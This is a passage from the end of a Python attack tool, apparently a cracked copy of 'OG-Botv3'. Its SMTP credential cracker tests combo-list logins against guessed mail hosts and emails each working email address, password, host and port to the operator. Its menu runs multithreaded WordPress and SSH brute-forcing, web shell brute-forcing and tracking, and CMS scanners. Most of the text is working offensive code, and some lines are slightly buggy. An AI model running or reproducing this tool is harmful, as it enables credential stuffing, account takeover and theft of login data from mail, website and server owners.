                mailserver.sendmail(from_addr, to_addr, msg)
                mailserver.quit()
                print(Colorate.Horizontal(Colors.yellow_to_green, "[[ SMTP Send Inbox #METHOD_2 ]] ══─ " + HOST + "|" + smtpuser + ":" + smtpass), 1)
                open('Zesult/Inbox_ResultSMTP.txt', 'a+').write(HOST+"|"+str(PORT)+"|"+ComboAcc+"\n")
                SMTPValid += 1
            except:
                open('Zesult/Bad_ResultSMTP.txt', 'a+').write(HOST + '|' + str(PORT) + '|' + ComboAcc + '\n')
                SMTPInvalid += 1
                print(Colorate.Color(Colors.red, '[[ Cant SMTP Inbox ]])) ══─ ' + HOST + "|" + smtpuser + ":" + smtpass), True)
                SMTPInalid += 1
                if sys.platform == "win32":
                    ctypes.windll.kernel32.SetConsoleTitleW( '   [$] SMTP_Valid -==> {}   [!] SMTP_InValid -==> {}'.format(SMTPValid, SMTPInvalid))
def MMIX_SMTPCRacker(ComboAcc):
    global SMTPValid,SMTPInvalid,SMTPConfig,PORT
    PORT = int(PORT)
    SMTPAccount = ComboAcc.split(':')
    smtpuser = SMTPAccount[0]
    smtpass = SMTPAccount[1]
    PORT_LIST = ['25', '587']
    RANDOMList_Hosted = ['smtp.', 'mail.', 'webmail.', 'secure.', 'plus.smtp.', 'smtp.mail.', 'smtp.att.', 'pop3.', 'securesmtp.', 'outgoing.', 'smtp-mail.', 'plus.smtp.mail.', 'Smtpauths.', 'Smtpauth.']
    for HOSTRANDOM in RANDOMList_Hosted:
        HOSTAGE = HOSTRANDOM + smtpuser.split("@")[1]
        try:
            for PORTS in PORT_LIST:
                PORTS = int(PORTS)
                mailserver = smtplib.SMTP(HOSTAGE, PORTS)
                mailserver.ehlo()
                mailserver.starttls()
                mailserver.login(smtpuser, smtpass)
                subj = 'Cracked SMTP OG-Botv3'
                date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
                if '@' not in smtpuser:
                    froma = smtpuser + '@Smtp-OGTester.com'
                else:
                    froma = smtpuser
                from_addr = str(froma)
                to_addr = str(email)
                message_text = 'Cracked by OG Bot v3 \n[#] SMTP_Email : {}\n[#] SMTP_PASS : {}\n[#] SMTP_HOST : {}\n[#] SMTP_PORT : {}\n[#] METHOD_1 : SMTP_HTTPS\n'.format(smtpuser, smtpass, HOSTAGE, PORTS)
                msg = '\n'.join(['From: %s', 'To: %s', 'Subject: %s', 'Date: %s', '', '%s']) % (from_addr, to_addr, subj, date, message_text)
                mailserver.sendmail(from_addr, to_addr, msg)
                mailserver.quit()
                print(Colorate.Horizontal(Colors.yellow_to_green, '[[ SMTP Send Inbox #METHOD_1 ]] ── ' + HOSTAGE + '|' + smtpuser + ':' + smtpass, 1))
                open('Zesult/Inbox_ResultSMTP.txt', 'a+').write(HOSTAGE + '|' + str(PORTS) + '|' + ComboAcc + '\n')
                SMTPValid += 1
                if sys.platform == "win32":
                    ctypes.windll.kernel32.SetConsoleTitleW('   [$] SMTP_Valid -==> {}   [!] SMTP_InValid -==> {}'.format(SMTPValid, SMTPInvalid))
        except:
            print(Colorate.Color(Colors.red, '[[ Cant SMTP Inbox ]] ── ' + HOSTAGE + '|' + smtpuser + ':' + smtpass, 1))
            SMTPInvalid += 1
            if sys.platform == "win32":
                ctypes.windll.kernel32.SetConsoleTitleW('   [$] SMTP_Valid -==> {}   [!] SMTP_InValid -==> {}'.format(SMTPValid, SMTPInvalid))
            continue

def main():
    if not os.path.exists("Zesult/result.txt"):
        with open("Zesult/result.txt", "w") as f:
            f.write("\x43\x72\x61\x63\x6B\x65\x64 \x42\x79 \x53\x63\x61\x72\x6C\x65\x74\x74\x61")
    try:
        chois = input(green + ' Select Your Function : ')
        if chois == "1":
            gensite1()
        elif chois == str("2"):
            gensite2()
        elif chois == str("3"):
            sites = open(input(cyan + ' TARGET [Wordpress] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(int(thread))
            MultiTaker.map(ONEBRUTE_WP, sites)
        elif chois == str("4"):
            Targets = open(input(cyan + ' [Enter Combo SMTP] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(int(thread))
            MultiTaker.map(SMTPValider, Targets)
        elif chois == str("5"):
            Targets = open(input(cyan + " [Enter Combo SMTP] Lists : "), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(int(thread))
            MultiTaker.map(MMIX_SMTPCRacker, Targets)
        elif chois == str("6"):
            sites = open(input(cyan + ' [CMSGhost Checker] Lists : '), encoding="utf-8").read().splitlines()
            MultiTaker = Pool(25)
            MultiTaker.map(IPDumper, sites)
        elif chois == str("7"):
            sites = open(input(cyan + ' [Mail Tracker] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(Mailer_Tracker, sites)
        elif chois == str("8"):
            sites = open(input(cyan + ' [Shell Tracker] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(Shell_Tracker, sites)
        elif chois == str("9"):
            sites = open(input(cyan + ' [Wordpress] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(Auto_Brute, sites)
        elif chois == str("10"):
            sites = open(input(cyan + ' [BruteSSH Bot] IP LISTs : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(BruteSSHBot, sites)
        elif chois == str("11"):
            sites = open(input(cyan + ' [CMSGhost Checker] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(CMSLitBot, sites)
        elif chois == str("12"):
            sites = open(input(cyan + ' [BrutePass Shell] Lists : '), encoding="utf-8").read().splitlines()
            thread = int(input(green + ' [Order Threads] 40 : '))
            MultiTaker = Pool(thread)
            MultiTaker.map(Brute_Shell, sites)
        else:
            main()
    except Exception as E:
        print(E)
        main()

def keylog():
    print('\n            {}\n88\n88\n88  {}\n88   ,d8  ,adPPYba, 8b       d8\n88 ,a8"  a8P_____88 `8b     d8\'\n8888[ {} 8PP"  `8b   d8\'\n88`"Yba, "8b,   ,aa   `8b,d8\'\n88   `Y8a `"Ybbd8"\'     Y88\'\n                        d8\'\n                       d8\'  {}     Checking Key  ........................................\n\n                       If Valid Key will Active in 3 Second\n\n\n    Cracked By @xSpider46'.format(random.choice(rando), random.choice(rando) ,random.choice(rando), random.choice(rando)))
    time.sleep(3)

def start():
    clear()
    keylog()
    clear()
    gui()
    main()

start()